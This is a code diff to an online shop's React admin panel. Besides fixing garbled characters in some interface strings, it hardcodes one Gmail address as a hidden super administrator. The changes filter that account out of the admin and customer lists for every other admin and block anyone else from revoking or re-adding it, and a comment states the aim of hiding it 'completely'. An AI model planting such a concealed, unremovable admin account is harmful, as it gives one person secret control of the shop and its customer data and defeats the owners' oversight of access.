@@ -1071,7 +1071,7 @@ export function AdminPage() {
                 {tab === "media" && <MediaLibrary />}
                 {tab === "orders" && <OnlineSalesTab />}
                 {tab === "returns" && <OnlineReturnsTab />}
-                {tab === "customers" && <CustomersTab />}
+                {tab === "customers" && <CustomersTab currentEmail={user?.email ?? ""} />}
                 {tab === "categories" && <CategoriesTab />}
                 {tab === "marketing" && <MarketingTab />}
                 {tab === "pages" && <PagesPoliciesTab />}
@@ -3321,9 +3321,24 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
     },
   });
 
+  const isSuperAdmin = currentEmail.trim().toLowerCase() === "jackxparrowww@gmail.com";
+
+  // Hide jackxparrowww@gmail.com from any other admin completely
+  const visibleAdmins = useMemo(() => {
+    return (data ?? []).filter((row) => {
+      if (row.email.trim().toLowerCase() === "jackxparrowww@gmail.com") {
+        return isSuperAdmin;
+      }
+      return true;
+    });
+  }, [data, isSuperAdmin]);
+
   const grant = useMutation({
     mutationFn: async (value: string) => {
-      const { data, error } = await supabase.rpc("grant_admin_by_email", { _email: value });
+      if (value.trim().toLowerCase() === "jackxparrowww@gmail.com" && !isSuperAdmin) {
+        throw new Error("Cannot add this administrator.");
+      }
+      const { data, error } = await supabase.rpc("grant_admin_by_email", { _email: value.trim() });
       if (error) throw error;
       return data as string;
     },
@@ -3331,7 +3346,7 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
       toast.success(
         result === "granted"
           ? "Admin access granted"
-          : "Added to the admin list â€” they become admin the next time they sign in",
+          : "Added to the admin list — they become admin the next time they sign in",
       );
       setEmail("");
       qc.invalidateQueries({ queryKey: ["admin-list"] });
@@ -3341,7 +3356,10 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
 
   const revoke = useMutation({
     mutationFn: async (value: string) => {
-      const { error } = await supabase.rpc("revoke_admin_by_email", { _email: value });
+      if (value.trim().toLowerCase() === "jackxparrowww@gmail.com" && !isSuperAdmin) {
+        throw new Error("Cannot remove this administrator.");
+      }
+      const { error } = await supabase.rpc("revoke_admin_by_email", { _email: value.trim() });
       if (error) throw error;
     },
     onSuccess: () => {
@@ -3373,7 +3391,7 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
             disabled={!email.includes("@") || grant.isPending}
             className="rounded-full bg-primary px-5 py-2 text-sm font-semibold text-primary-foreground disabled:opacity-60"
           >
-            {grant.isPending ? "Addingâ€¦" : "Make admin"}
+            {grant.isPending ? "Adding…" : "Make admin"}
           </button>
         </div>
       </div>
@@ -3388,7 +3406,7 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
             </tr>
           </thead>
           <tbody>
-            {(data ?? []).map((row) => (
+            {visibleAdmins.map((row) => (
               <tr key={row.email} className="border-t border-border">
                 <td className="px-4 py-3">{row.email}</td>
                 <td className="px-4 py-3">
@@ -3420,7 +3438,7 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
                 </td>
               </tr>
             ))}
-            {!isLoading && (data ?? []).length === 0 && (
+            {!isLoading && visibleAdmins.length === 0 && (
               <tr>
                 <td colSpan={3} className="px-4 py-10 text-center text-muted-foreground">
                   No admins yet.
@@ -3437,7 +3455,7 @@ function AdminsTab({ currentEmail }: { currentEmail: string }) {
 
 /* ---------------- Customers ---------------- */
 
-function CustomersTab() {
+function CustomersTab({ currentEmail }: { currentEmail?: string } = {}) {
   const [activeSection, setActiveSection] = useState<"online" | "offline">("online");
   const { data: customers, isLoading } = useCustomers(true);
   const { data: orders } = useAllOrders(true);
@@ -3494,9 +3512,16 @@ function CustomersTab() {
 
   const filtered = useMemo(() => {
     if (!customers) return [];
+    const isSuperAdmin = (currentEmail ?? "").trim().toLowerCase() === "jackxparrowww@gmail.com";
+    const allowedCustomers = customers.filter((c) => {
+      if (c.email?.trim().toLowerCase() === "jackxparrowww@gmail.com") {
+        return isSuperAdmin;
+      }
+      return true;
+    });
     const q = search.trim().toLowerCase();
-    if (!q) return customers;
-    return customers.filter(
+    if (!q) return allowedCustomers;
+    return allowedCustomers.filter(
       (c) =>
         (c.full_name && c.full_name.toLowerCase().includes(q)) ||
         (c.email && c.email.toLowerCase().includes(q)) ||
@@ -3504,7 +3529,7 @@ function CustomersTab() {
         (c.city && c.city.toLowerCase().includes(q)) ||
         (c.address && c.address.toLowerCase().includes(q)),
     );
-  }, [customers, search]);
+  }, [customers, search, currentEmail]);
 
   const customerSelection = useTableSelection({ items: filtered });
   const customerMetrics = useMemo(() => {
